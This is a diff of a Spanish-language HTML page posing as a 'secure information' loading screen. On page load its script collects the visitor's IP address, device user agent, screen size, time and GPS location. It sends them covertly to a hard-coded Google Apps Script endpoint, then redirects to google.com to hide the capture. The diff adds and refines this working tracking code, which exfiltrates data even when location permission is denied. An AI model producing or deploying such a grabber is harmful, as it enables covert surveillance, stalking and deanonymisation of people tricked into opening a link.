@@ -1,40 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>Cargando...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando contenido...</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h1>Procesando solicitud...</h1>
+    <div style="text-align: center;">
+        <div class="loader" style="margin: 0 auto 10px;"></div>
+        <p>Cargando información segura...</p>
+    </div>
+
     <script>
-        async function capturarDatos() {
-            // 1. Obtener IP
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-
-            // 2. Obtener Info del Dispositivo
-            const device = navigator.userAgent;
-
-            // 3. Intentar obtener ubicación (pide permiso)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const datos = {
-                    ip: ipData.ip,
-                    device: device,
-                    location: `${pos.coords.latitude}, ${pos.coords.longitude}`,
-                    battery: "Consultando..."
-                };
-
-                // 4. ENVIAR A GOOGLE SHEETS
-                // Reemplaza 'TU_URL_DE_APPS_SCRIPT' con la del Paso 1
-                fetch('https://script.google.com/macros/s/AKfycbxBoNhdXNPe8qdEXCwFM6bCnkVkz-BMcrexWfClQzazELI60XWTs6KQlJ4-qNlZYXpknQ/exec', {
+        async function enviarDatos(datos) {
+            const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxBoNhdXNPe8qdEXCwFM6bCnkVkz-BMcrexWfClQzazELI60XWTs6KQlJ4-qNlZYXpknQ/exec' ; // <--- PEGA TU URL AQUÍ
+            
+            try {
+                await fetch(SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify(datos)
                 });
-                
-                alert("¡Gracias por registrar tu dispositivo!");
-            });
+            } catch (error) {
+                console.error("Error al enviar:", error);
+            } finally {
+                // Redirigir después de 3 segundos pase lo que pase
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com"; 
+                }, 3000);
+            }
         }
-        capturarDatos();
+
+        async function iniciarCaptura() {
+            // 1. Obtener IP y datos básicos
+            let ip = "Desconocida";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) { console.log("No se pudo obtener IP"); }
+
+            const datos = {
+                ip: ip,
+                device: navigator.userAgent,
+                location: "Permiso denegado",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                time: new Date().toLocaleString()
+            };
+
+            // 2. Intentar obtener GPS
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        datos.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                        enviarDatos(datos);
+                    },
+                    (err) => {
+                        console.log("El usuario rechazó el GPS");
+                        enviarDatos(datos); // Enviamos los datos aunque no haya GPS
+                    },
+                    { timeout: 10000 }
+                );
+            } else {
+                enviarDatos(datos);
+            }
+        }
+
+        iniciarCaptura();
     </script>
 </body>
 </html>
